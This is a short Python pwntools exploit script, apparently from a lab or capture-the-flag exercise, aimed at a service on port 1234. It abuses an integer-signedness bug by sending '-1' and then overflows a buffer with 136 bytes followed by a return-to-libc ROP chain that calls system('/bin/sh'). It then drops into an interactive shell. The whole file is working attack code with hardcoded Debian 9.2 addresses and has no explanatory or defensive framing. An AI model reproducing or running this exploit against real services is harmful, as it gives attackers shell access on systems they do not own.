from pwn import *

# Addresses debian 9.2
pr = 0x400723 # pop rdi; ret
system = 0x7ffff7a79450
exit = 0x7ffff7a6f950
binsh = 0x7ffff7b9b9f9

context.log_level = 'debug'

# Exploit
def main():

# open process
    r = remote('localhost', 1234)
    #r = remote('192.168.122.76', 1234)
    
    # integer signedness
    r.sendline("-1")
    r.recvuntil("Input text:")

    # exploit
    exploit = "A" * 136
    exploit += p64(pr)
    exploit += p64(binsh)
    exploit += p64(system)
    exploit += p64(exit)
    r.sendline(exploit)
    
    r.interactive()
# Main
if __name__ == "__main__":
    main()
